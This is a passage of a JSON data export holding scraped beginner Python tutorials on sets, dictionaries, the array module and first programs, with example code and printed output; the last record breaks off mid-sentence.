    "text": "In Python, Set is an unordered collection of data type that is iterable, mutable and has no duplicate elements. The order of elements in a set is undefined though it may consist of various elements.The major advantage of using a set, as opposed to a list, is that it has a highly optimized method for checking whether a specific element is contained in the set.Creating a SetSets can be created by using the built-in set() function with an iterable object or a sequence by placing the sequence inside curly braces, separated by \u2018comma\u2019.Note \u2013 A set cannot have mutable elements like a list or dictionary, as it is mutable.\u00a0\u00a0Python3# Python program to demonstrate\u00a0# Creation of Set in Python\u00a0\u00a0# Creating a Setset1 = set()print(\"Initial blank Set: \")print(set1)\u00a0\u00a0# Creating a Set with\u00a0# the use of a Stringset1 = set(\"GeeksForGeeks\")print(\"\\nSet with the use of String: \")print(set1)\u00a0\u00a0# Creating a Set with# the use of Constructor# (Using object to Store String)String = 'GeeksForGeeks'set1 = set(String)print(\"\\nSet with the use of an Object: \" )print(set1)\u00a0\u00a0# Creating a Set with# the use of a Listset1 = set([\"Geeks\", \"For\", \"Geeks\"])print(\"\\nSet with the use of List: \")print(set1)Output:\u00a0Initial blank Set: \r\nset()\r\n\r\nSet with the use of String: \r\n{'e', 'r', 'k', 'o', 'G', 's', 'F'}\r\n\r\nSet with the use of an Object: \r\n{'r', 'o', 'e', 'F', 's', 'k', 'G'}\r\n\r\nSet with the use of List: \r\n{'Geeks', 'For'}A set contains only unique elements but at the time of set creation, multiple duplicate values can also be passed. Order of elements in a set is undefined and is unchangeable. Type of elements in a set need not be the same, various mixed up data type values can also be passed to the set.\u00a0Python3# Creating a Set with\u00a0# a List of Numbers# (Having duplicate values)set1 = set([1, 2, 4, 4, 3, 3, 3, 6, 5])print(\"\\nSet with the use of Numbers: \")print(set1)\u00a0\u00a0# Creating a Set with\u00a0# a mixed type of values# (Having numbers and strings)set1 = set([1, 2, 'Geeks', 4, 'For', 6, 'Geeks'])print(\"\\nSet with the use of Mixed Values\")print(set1)Output:\u00a0Set with the use of Numbers: \r\n{1, 2, 3, 4, 5, 6}\r\n\r\nSet with the use of Mixed Values\r\n{1, 2, 4, 'Geeks', 6, 'For'}Adding Elements to a SetUsing add() methodElements can be added to the Set by using built-in add() function. Only one element at a time can be added to the set by using add() method, loops are used to add multiple elements at a time with the use of add() method.Note \u2013 Lists cannot be added to a set as elements because Lists are not hashable whereas Tuples can be added because tuples are immutable and hence Hashable.\u00a0Python3# Python program to demonstrate\u00a0# Addition of elements in a Set\u00a0\u00a0# Creating a Setset1 = set()print(\"Initial blank Set: \")print(set1)\u00a0\u00a0# Adding element and tuple to the Setset1.add(8)set1.add(9)set1.add((6,7))print(\"\\nSet after Addition of Three elements: \")print(set1)\u00a0\u00a0# Adding elements to the Set# using Iteratorfor i in range(1, 6):\u00a0\u00a0\u00a0\u00a0set1.add(i)print(\"\\nSet after Addition of elements from 1-5: \")print(set1)Output:\u00a0Initial blank Set: \r\nset()\r\n\r\nSet after Addition of Three elements: \r\n{8, 9, (6, 7)}\r\n\r\nSet after Addition of elements from 1-5: \r\n{1, 2, 3, (6, 7), 4, 5, 8, 9}Using update() methodFor addition of two or more elements Update() method is used. The update() method accepts lists, strings, tuples as well as other sets as its arguments. In all of these cases, duplicate elements are avoided.Python3# Python program to demonstrate\u00a0# Addition of elements in a Set\u00a0\u00a0# Addition of elements to the Set# using Update functionset1 = set([ 4, 5, (6, 7)])set1.update([10, 11])print(\"\\nSet after Addition of elements using Update: \")print(set1)Output:\u00a0Set after Addition of elements using Update: \r\n{10, 11, 4, 5, (6, 7)}\r\n Accessing a SetSet items cannot be accessed by referring to an index, since sets are unordered the items has no index. But you can loop through the set items using a for loop, or ask if a specified value is present in a set, by using the in keyword.Python3# Python program to demonstrate# Accessing of elements in a set\u00a0\u00a0# Creating a setset1 = set([\"Geeks\", \"For\", \"Geeks\"])print(\"\\nInitial set\")print(set1)\u00a0\u00a0# Accessing element using# for loopprint(\"\\nElements of set: \")for i in set1:\u00a0\u00a0\u00a0\u00a0print(i, end=\" \")\u00a0\u00a0# Checking the element# using in keywordprint(\"Geeks\" in set1)Output:\u00a0Initial set: \r\n{'Geeks', 'For'}\r\n\r\nElements of set: \r\nGeeks For \r\n\r\nTrue Removing elements from the SetUsing remove() method or discard() methodElements can be removed from the Set by using built-in remove() function but a KeyError arises if element doesn\u2019t exist in the set. To remove elements from a set without KeyError, use discard(), if the element doesn\u2019t exist in the set, it remains unchanged.Python3# Python program to demonstrate\u00a0# Deletion of elements in a Set\u00a0\u00a0# Creating a Setset1 = set([1, 2, 3, 4, 5, 6,\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a07, 8, 9, 10, 11, 12])print(\"Initial Set: \")print(set1)\u00a0\u00a0# Removing elements from Set# using Remove() methodset1.remove(5)set1.remove(6)print(\"\\nSet after Removal of two elements: \")print(set1)\u00a0\u00a0# Removing elements from Set# using Discard() methodset1.discard(8)set1.discard(9)print(\"\\nSet after Discarding two elements: \")print(set1)\u00a0\u00a0# Removing elements from Set# using iterator methodfor i in range(1, 5):\u00a0\u00a0\u00a0\u00a0set1.remove(i)print(\"\\nSet after Removing a range of elements: \")print(set1)Output:\u00a0Initial Set: \r\n{1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12}\r\n\r\nSet after Removal of two elements: \r\n{1, 2, 3, 4, 7, 8, 9, 10, 11, 12}\r\n\r\nSet after Discarding two elements: \r\n{1, 2, 3, 4, 7, 10, 11, 12}\r\n\r\nSet after Removing a range of elements: \r\n{7, 10, 11, 12}Using pop() methodPop() function can also be used to remove and return an element from the set, but it removes only the last element of the set.\u00a0Note \u2013 If the set is unordered then there\u2019s no such way to determine which element is popped by using the pop() function.\u00a0Python3# Python program to demonstrate\u00a0# Deletion of elements in a Set\u00a0\u00a0# Creating a Setset1 = set([1, 2, 3, 4, 5, 6,\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a07, 8, 9, 10, 11, 12])print(\"Initial Set: \")print(set1)\u00a0\u00a0# Removing element from the\u00a0# Set using the pop() methodset1.pop()print(\"\\nSet after popping an element: \")print(set1)Output:\u00a0Initial Set: \r\n{1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12}\r\n\r\nSet after popping an element: \r\n{2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12}Using clear() methodTo remove all the elements from the set, clear() function is used.\u00a0Python3#Creating a setset1 = set([1,2,3,4,5])print(\"\\n Initial set: \")print(set1)\u00a0\u00a0\u00a0\u00a0# Removing all the elements from\u00a0# Set using clear() methodset1.clear()print(\"\\nSet after clearing all the elements: \")print(set1)Output:\u00a0Initial set:\r\n{1, 2, 3, 4, 5}\r\n\r\nSet after clearing all the elements: \r\nset()Frozen sets in Python are immutable objects that only support methods and operators that produce a result without affecting the frozen set or sets to which they are applied. While elements of a set can be modified at any time, elements of the frozen set remain the same after creation.\u00a0If no parameters are passed, it returns an empty frozenset.\u00a0\u00a0Python3# Python program to demonstrate\u00a0# working of a FrozenSet\u00a0\u00a0\u00a0# Creating a SetString = ('G', 'e', 'e', 'k', 's', 'F', 'o', 'r')\u00a0\u00a0Fset1 = frozenset(String)print(\"The FrozenSet is: \")print(Fset1)\u00a0\u00a0# To print Empty Frozen Set# No parameter is passedprint(\"\\nEmpty FrozenSet: \")print(frozenset())Set MethodsFunctionDescriptionadd()Adds an element to a setremove()Removes an element from a set. If the element is not present in the set, raise a KeyErrorclear()Removes all elements form a setcopy()Returns a shallow copy of a setpop()Removes and returns an arbitrary set element. Raise KeyError if the set is emptyupdate()Updates a set with the union of itself and othersunion()Returns the union of sets in a new setdifference()Returns the difference of two or more sets as a new setdifference_update()Removes all elements of another set from this setdiscard()Removes an element from set if it is a member. (Do nothing if the element is not in set)intersection()Returns the intersection of two sets as a new setintersection_update()Updates the set with the intersection of itself and anotherisdisjoint()Returns True if two sets have a null intersectionissubset()Returns True if another set contains this setissuperset()Returns True if this set contains another setsymmetric_difference()Returns the symmetric difference of two sets as a new setsymmetric_difference_update()Updates a set with the symmetric difference of itself and anotherRecent Articles on Python SetsSet ProgramsProgram to accept the strings which contains all vowelsPython program to find common elements in three lists using setsFind missing and additional values in two listsPairs of complete strings in two setsCheck whether a given string is Heterogram or notMaximum and Minimum in a SetRemove items from SetPython Set difference to find lost element from a duplicated arrayMinimum number of subsets with distinct elements using CounterCheck if two lists have at-least one element commonProgram to count number of vowels using sets in given stringDifference between two listsPython set to check if string is panagramPython set operations (union, intersection, difference and symmetric difference)Concatenated string with uncommon characters in PythonPython dictionary, set and counter to check if frequencies can become sameUsing Set() in Python Pangram CheckingSet update() in Python to do union of n arraysUseful LinksOutput of Python programs \u2013 SetsRecent Articles on Python SetsMultiple Choice Questions \u2013 PythonAll articles in Python CategoryMy Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "1c8839dad096dc5727472b63f35be172",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Dictionary in Python is an unordered collection of data values, used to store data values like a map, which, unlike other Data Types that hold only a single value as an element, Dictionary holds key:value pair. Key-value is provided in the dictionary to make it more optimized.\u00a0\u00a0Note \u2013 Keys in a dictionary don\u2019t allow Polymorphism.Disclamer: It is important to note that Dictionaries have been modified to maintain insertion order with the release of Python 3.7, so they are now ordered collection of data values.Creating a DictionaryIn Python, a Dictionary can be created by placing a sequence of elements within curly {} braces, separated by \u2018comma\u2019. Dictionary holds pairs of values, one being the Key and the other corresponding pair element being its Key:value. Values in a dictionary can be of any data type and can be duplicated, whereas keys can\u2019t be repeated and must be immutable.\u00a0\u00a0Note \u2013 Dictionary keys are case sensitive, the same name but different cases of Key will be treated distinctly.\u00a0Python3# Creating a Dictionary# with Integer KeysDict = {1: 'Geeks', 2: 'For', 3: 'Geeks'}print(\"\\nDictionary with the use of Integer Keys: \")print(Dict)\u00a0# Creating a Dictionary# with Mixed keysDict = {'Name': 'Geeks', 1: [1, 2, 3, 4]}print(\"\\nDictionary with the use of Mixed Keys: \")print(Dict)Output:\u00a0Dictionary with the use of Integer Keys: \n{1: 'Geeks', 2: 'For', 3: 'Geeks'}\n\nDictionary with the use of Mixed Keys: \n{1: [1, 2, 3, 4], 'Name': 'Geeks'}Dictionary can also be created by the built-in function dict(). An empty dictionary can be created by just placing to curly braces{}.\u00a0Python3# Creating an empty DictionaryDict = {}print(\"Empty Dictionary: \")print(Dict)\u00a0# Creating a Dictionary# with dict() methodDict = dict({1: 'Geeks', 2: 'For', 3:'Geeks'})print(\"\\nDictionary with the use of dict(): \")print(Dict)\u00a0# Creating a Dictionary# with each item as a PairDict = dict([(1, 'Geeks'), (2, 'For')])print(\"\\nDictionary with each item as a pair: \")print(Dict)Output:\u00a0Empty Dictionary: \n{}\n\nDictionary with the use of dict(): \n{1: 'Geeks', 2: 'For', 3: 'Geeks'}\n\nDictionary with each item as a pair: \n{1: 'Geeks', 2: 'For'}Nested Dictionary:\u00a0Python3# Creating a Nested Dictionary# as shown in the below imageDict = {1: 'Geeks', 2: 'For',\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a03:{'A' : 'Welcome', 'B' : 'To', 'C' : 'Geeks'}}\u00a0print(Dict)Output:\u00a0{1: 'Geeks', 2: 'For', 3: {'A': 'Welcome', 'B': 'To', 'C': 'Geeks'}}Adding elements to a DictionaryIn Python Dictionary, the Addition of elements can be done in multiple ways. One value at a time can be added to a Dictionary by defining value along with the key e.g. Dict[Key] = \u2018Value\u2019. Updating an existing value in a Dictionary can be done by using the built-in update() method. Nested key values can also be added to an existing Dictionary.\u00a0\u00a0Note- While adding a value, if the key-value already exists, the value gets updated otherwise a new Key with the value is added to the Dictionary.Python3# Creating an empty DictionaryDict = {}print(\"Empty Dictionary: \")print(Dict)\u00a0# Adding elements one at a timeDict[0] = 'Geeks'Dict[2] = 'For'Dict[3] = 1print(\"\\nDictionary after adding 3 elements: \")print(Dict)\u00a0# Adding set of values# to a single KeyDict['Value_set'] = 2, 3, 4print(\"\\nDictionary after adding 3 elements: \")print(Dict)\u00a0# Updating existing Key's ValueDict[2] = 'Welcome'print(\"\\nUpdated key value: \")print(Dict)\u00a0# Adding Nested Key value to DictionaryDict[5] = {'Nested' :{'1' : 'Life', '2' : 'Geeks'}}print(\"\\nAdding a Nested Key: \")print(Dict)Output:\u00a0\u00a0Empty Dictionary: \n{}\n\nDictionary after adding 3 elements: \n{0: 'Geeks', 2: 'For', 3: 1}\n\nDictionary after adding 3 elements: \n{0: 'Geeks', 2: 'For', 3: 1, 'Value_set': (2, 3, 4)}\n\nUpdated key value: \n{0: 'Geeks', 2: 'Welcome', 3: 1, 'Value_set': (2, 3, 4)}\n\nAdding a Nested Key: \n{0: 'Geeks', 2: 'Welcome', 3: 1, 5: {'Nested': {'1': 'Life', '2': 'Geeks'}}, 'Value_set': (2, 3, 4)}Accessing elements from a DictionaryIn order to access the items of a dictionary refer to its key name. Key can be used inside square brackets.\u00a0Python3# Python program to demonstrate\u00a0# accessing a element from a Dictionary\u00a0# Creating a DictionaryDict = {1: 'Geeks', 'name': 'For', 3: 'Geeks'}\u00a0# accessing a element using keyprint(\"Accessing a element using key:\")print(Dict['name'])\u00a0# accessing a element using keyprint(\"Accessing a element using key:\")print(Dict[1])Output:\u00a0Accessing a element using key:\nFor\n\nAccessing a element using key:\nGeeksThere is also a method called get() that will also help in accessing the element from a dictionary.Python3# Creating a DictionaryDict = {1: 'Geeks', 'name': 'For', 3: 'Geeks'}\u00a0# accessing a element using get()# methodprint(\"Accessing a element using get:\")print(Dict.get(3))Output:\u00a0Accessing a element using get:\nGeeksAccessing an element of a nested dictionaryIn order to access the value of any key in the nested dictionary, use indexing [] syntax.Python3# Creating a DictionaryDict = {'Dict1': {1: 'Geeks'},\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'Dict2': {'Name': 'For'}}\u00a0# Accessing element using keyprint(Dict['Dict1'])print(Dict['Dict1'][1])print(Dict['Dict2']['Name'])Output:\u00a0{1: 'Geeks'}\nGeeks\nForRemoving Elements from DictionaryUsing del keywordIn Python Dictionary, deletion of keys can be done by using the del keyword. Using the del keyword, specific values from a dictionary as well as the whole dictionary can be deleted. Items in a Nested dictionary can also be deleted by using the del keyword and providing a specific nested key and particular key to be deleted from that nested Dictionary.\u00a0Note: The del Dict will delete the entire dictionary and hence printing it after deletion will raise an Error.Python3# Initial DictionaryDict = { 5 : 'Welcome', 6 : 'To', 7 : 'Geeks',\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'A' : {1 : 'Geeks', 2 : 'For', 3 : 'Geeks'},\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'B' : {1 : 'Geeks', 2 : 'Life'}}print(\"Initial Dictionary: \")print(Dict)\u00a0# Deleting a Key valuedel Dict[6]print(\"\\nDeleting a specific key: \")print(Dict)\u00a0# Deleting a Key from# Nested Dictionarydel Dict['A'][2]print(\"\\nDeleting a key from Nested Dictionary: \")print(Dict)Output:\u00a0Initial Dictionary: \n{'A': {1: 'Geeks', 2: 'For', 3: 'Geeks'}, 'B': {1: 'Geeks', 2: 'Life'}, 5: 'Welcome', 6: 'To', 7: 'Geeks'}\n\nDeleting a specific key: \n{'A': {1: 'Geeks', 2: 'For', 3: 'Geeks'}, 'B': {1: 'Geeks', 2: 'Life'}, 5: 'Welcome', 7: 'Geeks'}\n\nDeleting a key from Nested Dictionary: \n{'A': {1: 'Geeks', 3: 'Geeks'}, 'B': {1: 'Geeks', 2: 'Life'}, 5: 'Welcome', 7: 'Geeks'}Using pop() methodPop() method is used to return and delete the value of the key specified.Python3# Creating a DictionaryDict = {1: 'Geeks', 'name': 'For', 3: 'Geeks'}\u00a0# Deleting a key# using pop() methodpop_ele = Dict.pop(1)print('\\nDictionary after deletion: ' + str(Dict))print('Value associated to poped key is: ' + str(pop_ele))Output:\u00a0Dictionary after deletion: {3: 'Geeks', 'name': 'For'}\nValue associated to poped key is: GeeksUsing popitem() methodThe popitem() returns and removes an arbitrary element (key, value) pair from the dictionary.Python3# Creating DictionaryDict = {1: 'Geeks', 'name': 'For', 3: 'Geeks'}\u00a0# Deleting an arbitrary key# using popitem() functionpop_ele = Dict.popitem()print(\"\\nDictionary after deletion: \" + str(Dict))print(\"The arbitrary pair returned is: \" + str(pop_ele))Output:\u00a0Dictionary after deletion: {3: 'Geeks', 'name': 'For'}\nThe arbitrary pair returned is: (1, 'Geeks')\u00a0Using clear() methodAll the items from a dictionary can be deleted at once by using clear() method.Python3# Creating a DictionaryDict = {1: 'Geeks', 'name': 'For', 3: 'Geeks'}\u00a0\u00a0# Deleting entire DictionaryDict.clear()print(\"\\nDeleting Entire Dictionary: \")print(Dict)Output:\u00a0Deleting Entire Dictionary: \n{}Dictionary Methods\u00a0MethodsDescriptioncopy()They copy() method returns a shallow copy of the dictionary.clear()The clear() method removes all items from the dictionary.pop()Removes and returns an element from a dictionary having the given key.popitem()Removes the arbitrary key-value pair from the dictionary and returns it as tuple.get()It is a conventional method to access a value for a key.dictionary_name.values()returns a list of all the values available in a given dictionary.str()Produces a printable string representation of a dictionary.update()Adds dictionary dict2\u2019s key-values pairs to dictsetdefault()Set dict[key]=default if key is not already in dictkeys()Returns list of dictionary dict\u2019s keysitems()Returns a list of dict\u2019s (key, value) tuple pairshas_key()Returns true if key in dictionary dict, false otherwisefromkeys()Create a new dictionary with keys from seq and values set to value.type()Returns the type of the passed variable.cmp()Compares elements of both dict.Recent Articles on Python Dictionaryhttps://youtu.be/z7z_e5More Videos on Python Dictionary:\u00a0Python Dictionary Set 2\u00a0Python Dictionary Set 3\u00a0Dictionary ProgramsDictionary Methods \u2013 Set 1,Set 2Get() method for dictionariesHandling missing keys of dictionaryOrdered DictionaryorderDict()ChainmapMajority ElementDictionary and counter in Python to find winner of electionHow to implement Dictionary with Python3Possible Words using given characters in PythonPython dictionary, set and counter to check if frequencies can become samePython dictionary intersectionOrderedDict() in PythonCheck if binary representations of two numbers are anagramPython Counter to find the size of largest subset of anagram wordsPrint anagrams together in Python using List and DictionaryConvert a list of Tuples into DictionaryFind all duplicate characters in stringRemove all duplicates words from a given sentencePython Dictionary to find mirror characters in a stringPython counter and dictionary intersection example (Make a string using deletion and rearrangement)Second most repeated word in a sequence in PythonPython Dictionary ComprehensionK\u2019th Non-repeating Character in Python using List Comprehension and OrderedDictScraping And Finding Ordered Words In A Dictionary using PythonWays to sort list of dictionaries by values in Python \u2013 Using itemgetterMerging two DictionariesUseful Links\u00a0Recent Articles on Python DictionaryOutput of Python programs \u2013 DictionaryOutput of Python programs \u2013 DictionaryCoding Practice PlatformMultiple Choice Questions \u2013 PythonAll articles in Python CategoryMy Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "959fc3bc2b727a684cb855eda5433e0f",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "An array is a collection of items stored at contiguous memory locations. The idea is to store multiple items of the same type together. This makes it easier to calculate the position of each element by simply adding an offset to a base value, i.e., the memory location of the first element of the array (generally denoted by the name of the array).For simplicity, we can think of an array a fleet of stairs where on each step is placed a value (let\u2019s say one of your friends). Here, you can identify the location of any of your friends by simply knowing the count of the step they are on. Array can be handled in Python by a module named array. They can be useful when we have to manipulate only a specific data type values. A user can treat lists as arrays. However, user cannot constraint the type of elements stored in a list. If you create arrays using the array module, all elements of the array must be of the same type.\u00a0\u00a0\u00a0Creating a ArrayArray in Python can be created by importing array module. array(data_type, value_list) is used to create an array with data type and value list specified in its arguments.\u00a0\u00a0Python3# Python program to demonstrate# Creation of Array\u00a0# importing \"array\" for array creationsimport array as arr\u00a0# creating an array with integer typea = arr.array('i', [1, 2, 3])\u00a0# printing original arrayprint (\"The new created array is : \", end =\" \")for i in range (0, 3):\u00a0\u00a0\u00a0\u00a0print (a[i], end =\" \")print()\u00a0# creating an array with float typeb = arr.array('d', [2.5, 3.2, 3.3])\u00a0# printing original arrayprint (\"The new created array is : \", end =\" \")for i in range (0, 3):\u00a0\u00a0\u00a0\u00a0print (b[i], end =\" \")\u00a0\u00a0\u00a0\u00a0Output :\u00a0The new created array is :  1 2 3 \nThe new created array is :  2.5 3.2 3.3 Some of the data types are mentioned below which will help in creating an array of different data types.\u00a0\u00a0\u00a0Adding Elements to a ArrayElements can be added to the Array by using built-in insert() function. Insert is used to insert one or more data elements into an array. Based on the requirement, a new element can be added at the beginning, end, or any given index of array. append() is also used to add the value mentioned in its arguments at the end of the array.\u00a0\u00a0Python3# Python program to demonstrate# Adding Elements to a Array\u00a0# importing \"array\" for array creationsimport array as arr\u00a0# array with int typea = arr.array('i', [1, 2, 3])\u00a0\u00a0print (\"Array before insertion : \", end =\" \")for i in range (0, 3):\u00a0\u00a0\u00a0\u00a0print (a[i], end =\" \")print()\u00a0# inserting array using# insert() functiona.insert(1, 4)\u00a0print (\"Array after insertion : \", end =\" \")for i in (a):\u00a0\u00a0\u00a0\u00a0print (i, end =\" \")print()\u00a0# array with float typeb = arr.array('d', [2.5, 3.2, 3.3])\u00a0print (\"Array before insertion : \", end =\" \")for i in range (0, 3):\u00a0\u00a0\u00a0\u00a0print (b[i], end =\" \")print()\u00a0# adding an element using append()b.append(4.4)\u00a0print (\"Array after insertion : \", end =\" \")for i in (b):\u00a0\u00a0\u00a0\u00a0print (i, end =\" \")print()Output :\u00a0Array before insertion : 1 2 3 \nArray after insertion :  1 4 2 3 \nArray before insertion : 2.5 3.2 3.3 \nArray after insertion :  2.5 3.2 3.3 4.4 \u00a0Accessing elements from the ArrayIn order to access the array items refer to the index number. Use the index operator [ ] to access an item in a array. The index must be an integer.\u00a0\u00a0Python3# Python program to demonstrate# accessing of element from list\u00a0# importing array moduleimport array as arr\u00a0# array with int typea = arr.array('i', [1, 2, 3, 4, 5, 6])\u00a0# accessing element of arrayprint(\"Access element is: \", a[0])\u00a0# accessing element of arrayprint(\"Access element is: \", a[3])\u00a0# array with float typeb = arr.array('d', [2.5, 3.2, 3.3])\u00a0# accessing element of arrayprint(\"Access element is: \", b[1])\u00a0# accessing element of arrayprint(\"Access element is: \", b[2])Output :\u00a0Access element is:  1\nAccess element is:  4\nAccess element is:  3.2\nAccess element is:  3.3\u00a0Removing Elements from the ArrayElements can be removed from the array by using built-in remove() function but an Error arises if element doesn\u2019t exist in the set. Remove() method only removes one element at a time, to remove range of elements, iterator is used. pop() function can also be used to remove and return an element from the array, but by default it removes only the last element of the array, to remove element from a specific position of the array, index of the element is passed as an argument to the pop() method.Note \u2013 Remove method in List will only remove the first occurrence of the searched element.\u00a0\u00a0Python3# Python program to demonstrate# Removal of elements in a Array\u00a0\u00a0# importing \"array\" for array operationsimport array\u00a0\u00a0# initializing array with array values# initializes array with signed integersarr = array.array('i', [1, 2, 3, 1, 5])\u00a0# printing original arrayprint (\"The new created array is : \", end =\"\")for i in range (0, 5):\u00a0\u00a0\u00a0\u00a0print (arr[i], end =\" \")\u00a0print (\"\\r\")\u00a0# using pop() to remove element at 2nd positionprint (\"The popped element is : \", end =\"\")print (arr.pop(2))\u00a0# printing array after poppingprint (\"The array after popping is : \", end =\"\")for i in range (0, 4):\u00a0\u00a0\u00a0\u00a0print (arr[i], end =\" \")\u00a0print(\"\\r\")\u00a0# using remove() to remove 1st occurrence of 1arr.remove(1)\u00a0# printing array after removingprint (\"The array after removing is : \", end =\"\")for i in range (0, 3):\u00a0\u00a0\u00a0\u00a0print (arr[i], end =\" \")Output:\u00a0The new created array is : 1 2 3 1 5 \nThe popped element is : 3\nThe array after popping is : 1 2 1 5 \nThe array after removing is : 2 1 5 \u00a0Slicing of a ArrayIn Python array, there are multiple ways to print the whole array with all the elements, but to print a specific range of elements from the array, we use Slice operation. Slice operation is performed on array with the use of colon(:). To print elements from beginning to a range use [:Index], to print elements from end use [:-Index], to print elements from specific Index till the end use [Index:], to print elements within a range, use [Start Index:End Index] and to print whole List with the use of slicing operation, use [:]. Further, to print whole array in reverse order, use [::-1].\u00a0\u00a0\u00a0Python3# Python program to demonstrate# slicing of elements in a Array\u00a0# importing array moduleimport array as arr\u00a0# creating a listl = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]\u00a0a = arr.array('i', l)print(\"Initial Array: \")for i in (a):\u00a0\u00a0\u00a0\u00a0print(i, end =\" \")\u00a0# Print elements of a range# using Slice operationSliced_array = a[3:8]print(\"\\nSlicing elements in a range 3-8: \")print(Sliced_array)\u00a0# Print elements from a# pre-defined point to endSliced_array = a[5:]print(\"\\nElements sliced from 5th \"\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\"element till the end: \")print(Sliced_array)\u00a0# Printing elements from# beginning till endSliced_array = a[:]print(\"\\nPrinting all elements using slice operation: \")print(Sliced_array)OutputInitial Array: \n1 2 3 4 5 6 7 8 9 10 \nSlicing elements in a range 3-8: \narray('i', [4, 5, 6, 7, 8])\n\nElements sliced from 5th element till the end: \narray('i', [6, 7, 8, 9, 10])\n\nPrinting all elements using slice operation: \narray('i', [1, 2, 3, 4, 5, 6, 7, 8, 9, 10])Output :\u00a0Initial Array: \n1 2 3 4 5 6 7 8 9 10 \nSlicing elements in a range 3-8: \narray('i', [4, 5, 6, 7, 8])\n\nElements sliced from 5th element till the end: \narray('i', [6, 7, 8, 9, 10])\n\nPrinting all elements using slice operation: \narray('i', [1, 2, 3, 4, 5, 6, 7, 8, 9, 10])\u00a0Searching element in a ArrayIn order to search an element in the array we use a python in-built index() method. This function returns the index of the first occurrence of value mentioned in arguments.\u00a0\u00a0Python3# Python code to demonstrate# searching an element in array\u00a0\u00a0\u00a0# importing array moduleimport array\u00a0\u00a0# initializing array with array values# initializes array with signed integersarr = array.array('i', [1, 2, 3, 1, 2, 5])\u00a0# printing original arrayprint (\"The new created array is : \", end =\"\")for i in range (0, 6):\u00a0\u00a0\u00a0\u00a0print (arr[i], end =\" \")\u00a0print (\"\\r\")\u00a0# using index() to print index of 1st occurrence of 2print (\"The index of 1st occurrence of 2 is : \", end =\"\")print (arr.index(2))\u00a0# using index() to print index of 1st occurrence of 1print (\"The index of 1st occurrence of 1 is : \", end =\"\")print (arr.index(1))Output:\u00a0\u00a0The new created array is : 1 2 3 1 2 5 \nThe index of 1st occurrence of 2 is : 1\nThe index of 1st occurrence of 1 is : 0\u00a0Updating Elements in a ArrayIn order to update an element in the array we simply reassign a new value to the desired index we want to update.\u00a0\u00a0Python3# Python code to demonstrate# how to update an element in array\u00a0# importing array moduleimport array\u00a0# initializing array with array values# initializes array with signed integersarr = array.array('i', [1, 2, 3, 1, 2, 5])\u00a0# printing original arrayprint (\"Array before updation : \", end =\"\")for i in range (0, 6):\u00a0\u00a0\u00a0\u00a0print (arr[i], end =\" \")\u00a0print (\"\\r\")\u00a0# updating a element in a arrayarr[2] = 6print(\"Array after updation : \", end =\"\")for i in range (0, 6):\u00a0\u00a0\u00a0\u00a0print (arr[i], end =\" \")print()\u00a0# updating a element in a arrayarr[4] = 8print(\"Array after updation : \", end =\"\")for i in range (0, 6):\u00a0\u00a0\u00a0\u00a0print (arr[i], end =\" \")Output:\u00a0Array before updation : 1 2 3 1 2 5 \nArray after updation : 1 2 6 1 2 5 \nArray after updation : 1 2 6 1 8 5 My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "5ff6c1dbbfac04df599d7e6490ad2efc",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Introduction to Python has been dealt with in this article. Now, let us begin with learning python.Running your First Code in Python\u00a0Python programs are not compiled, rather they are interpreted. Now, let us move to writing a python code and running it. Please make sure that python is installed on the system you are working on. If it is not installed, download it from here. We will be using python 2.7.Making a Python file:\u00a0Python files are stored with the extension \u201c.py\u201d. Open a text editor and save a file with the name \u201chello.py\u201d. Open it and write the following code:Python3print (\"Hello World\")# Notice that NO semi-colon is to be usedReading the file contents:\u00a0Linux System \u2013 Move to the directory from the terminal where the created file (hello.py) is stored by using the \u2018cd\u2019 command and then type the following in the terminal :\u00a0python hello.pyWindows system \u2013 Open command prompt and move to the directory where the file is stored by using the \u2018cd\u2019 command and then run the file by writing the file name as a command.Variables in Python\u00a0Variables need not be declared first in python. They can be used directly. Variables in python are case-sensitive as most of the other programming languages.\u00a0Example:\u00a0Python3a = 3A = 4print (a)print (A)The output is :\u00a03\n4Expressions in Python\u00a0Arithmetic operations in python can be performed by using arithmetic operators and some of the in-built functions.\u00a0Python3a = 2b = 3c = a + bprint (c)d = a * bprint (d)The output is :\u00a05\n6Conditions in Python\u00a0Conditional output in python can be obtained by using if-else and elif (else if) statements.\u00a0Python3a = 3b = 9if b % a == 0 :\u00a0\u00a0\u00a0\u00a0print (\"b is divisible by a\")elif b + 1 == 10:\u00a0\u00a0\u00a0\u00a0print (\"Increment in b produces 10\")else:\u00a0\u00a0\u00a0\u00a0print (\"You are in else statement\")The output is :\u00a0b is divisible by aFunctions in Python\u00a0A function in python is declared by the keyword \u2018def\u2019 before the name of the function. The return type of the function need not be specified explicitly in python. The function can be invoked by writing the function name followed by the parameter list in the brackets.\u00a0Python3# Function for checking the 